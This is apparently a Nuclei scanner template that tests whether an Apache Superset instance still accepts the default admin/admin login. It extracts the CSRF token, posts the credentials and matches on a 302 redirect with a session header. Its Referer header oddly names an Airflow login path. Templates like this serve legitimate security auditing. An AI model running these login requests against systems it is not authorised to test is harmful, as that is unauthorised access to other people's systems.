id: apache-superset-default-login
info:
  author: dhiyaneshDK
  name: Apache Superset Default Login
  reference: https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/apache-superset-default-credentials.json
  severity: high
  tags: apache, default-login
requests:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: csrf_token
    part: body
    regex:
    - value="(.*?)">
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <title>Redirecting...</title>
    - <h1>Redirecting...</h1
    - <a href="/">
  - part: header
    type: word
    words:
    - session
  - status:
    - 302
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'GET /login/ HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    '
  - 'POST /login/ HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}/admin/airflow/login


    csrf_token={{csrf_token}}&username={{username}}&password={{password}}

    '
